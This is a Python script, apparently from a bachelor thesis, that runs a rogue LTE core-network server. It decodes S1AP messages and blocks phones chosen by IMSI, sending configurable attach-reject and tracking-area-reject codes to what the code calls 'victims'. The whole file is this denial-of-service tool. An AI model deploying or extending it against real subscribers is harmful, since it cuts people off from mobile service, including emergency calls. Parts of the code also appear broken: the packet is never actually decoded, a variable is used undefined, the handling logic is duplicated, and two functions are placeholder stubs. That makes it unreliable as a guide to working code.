#!/usr/bin/env python3
from EPC import *
#from parsing import parsing as parser
from parsing import * # not working with full web_app

import argparse
import json
import binascii
from struct import *

parser = parsing()

class BytesEncoder(json.JSONEncoder):
    def default(self, obj_bytes):
        if isinstance(obj_bytes, bytes):
            # return bytes format to string for printing to file
            return obj_bytes.hex()
        return json.JSONEncoder.default(self, obj_bytes)

def process_packet (epcServer ,s1ap, fd):
    (type, value) = S1AP.S1AP_PDU_Descriptions.S1AP_PDU()
    #print(value)
    with open("S1SetupRequest.json", "a") as write_file:
        #json.dump(msg.to_json(), write_file)
        write_file.write(type+'\n')
        write_file.write(json.dumps(value,cls=BytesEncoder))
        write_file.write('\n')
                    
        if type == 'initiatingMessage':
            procedure, protocolIEs_list = value['value'][0], value['value'][1]['protocolIEs']
            if procedure == 'S1SetupRequest':
                if parser.S1SetupRequest(epcServer, protocolIEs_list):
                    parser.S1SetupResponse(epcServer,fd, True)
                else:
                    parser.S1SetupResponse(epcServer,fd, False)
            elif procedure == 'InitialUEMessage':
                parser.InitialUEMessage(
                    epcServer, fd,
                    protocolIEs_list,
                            )
            elif procedure == 'UplinkNASTransport':
                parser.UplinkNASTransport(
                epcServer,fd,
                    protocolIEs_list
                    )
            elif procedure == 'UEContextReleaseRequest':
                print(procedure)
                parser.UEContextReleaseRequest(epcServer,protocolIEs_list)

            else:
                print("#### Type of the procedure not implemented ! ####")
                print(procedure)
                pass  # no need to implement others
        elif type == 'successfulOutcome':
            pass
        elif type == 'unsuccessfulOutcome':
            if procedure == 'S1SetupFailure':
                pass

def process_packet1(s1ap, fd, encode_and_send_packet):
    """Process the received packet"""
    # Your processing logic here
    print(f"Processing packet: {s1ap}")
    # After processing, you might need to send a response
    response = create_response(s1ap)  # Implement your own response creation logic
    encode_and_send_packet(fd, response)

def create_response(s1ap):
    """Create a response based on the decoded S1AP message"""
    # Your response creation logic here
    return s1ap  # Example response

if __name__ == "__main__":
    argParser = argparse.ArgumentParser(description='This is a bachelor thesis project.')
    group = argParser.add_mutually_exclusive_group(required=False)
    group.add_argument('--IMSITarget', '-t', type=str, nargs='+',help='IMSI list of targeted phones to be blocked')
    group.add_argument('--IMSIOmit', '-o', type=str, nargs='+',help='IMSI list of phones not to be blocked')
    argParser.add_argument('--address','-a',type=str,help="Change the address on which to listen for connections.")
    argParser.add_argument('--response','-r',type=int,help="attach reject response code for victims")
    argParser.add_argument('--TAresponse','-k',type=int,help="tracking area reject response code for victims")
    args = argParser.parse_args()
    epcServer = EPCServer(process_packet)
    parser = parsing()
    epcServer.omit = args.IMSIOmit
    epcServer.target = args.IMSITarget
    if args.response !=None:
        epcServer.attach_reject_reason = args.response
    if args.address != None:
        epcServer.listenAddress = args.address
    if args.TAresponse !=None:
        parser.cause_TAUreject = args.TAresponse
    while(True):
        print("Main loop cycle")
        if epcServer.state.get_current_state() == "null_state":
            epcServer.init_server()
            epcServer.state.set_current_state("initialised_socket_state")
            print("state is:", epcServer.state.get_current_state())
            epcServer.start()
        if epcServer.state.get_current_state() == "initialised_socket_state":
            poll_again = True
            while (poll_again):
                decoded, poll_again = epcServer.get_packet()
                # epcServer.close_server()
                if (decoded):
                    (type, value) = S1AP.S1AP_PDU_Descriptions.S1AP_PDU()
                    #print(value)
                    with open("S1SetupRequest.json", "a") as write_file:
                        #json.dump(msg.to_json(), write_file)
                        write_file.write(type+'\n')
                        write_file.write(json.dumps(value,cls=BytesEncoder))
                        write_file.write('\n')
                    
                    if type == 'initiatingMessage':
                        procedure, protocolIEs_list = value['value'][0], value['value'][1]['protocolIEs']
                        if procedure == 'S1SetupRequest':
                            if parser.S1SetupRequest(epcServer, protocolIEs_list):
                                parser.S1SetupResponse(epcServer, True)
                            else:
                                parser.S1SetupResponse(epcServer, False)
                        elif procedure == 'InitialUEMessage':
                            parser.InitialUEMessage(
                                epcServer, 
                                protocolIEs_list,
                            )
                        elif procedure == 'UplinkNASTransport':
                            parser.UplinkNASTransport(
                                epcServer,
                                protocolIEs_list
                            )
                        elif procedure == 'UEContextReleaseRequest':
                            print(procedure)
                            parser.UEContextReleaseRequest(epcServer,protocolIEs_list)

                        else:
                            print("#### Type of the procedure not implemented ! ####")
                            print(procedure)
                            pass  # no need to implement others
                    elif type == 'successfulOutcome':
                        pass
                    elif type == 'unsuccessfulOutcome':
                        if procedure == 'S1SetupFailure':
                            pass
        epcServer.close_server()
        #exit()
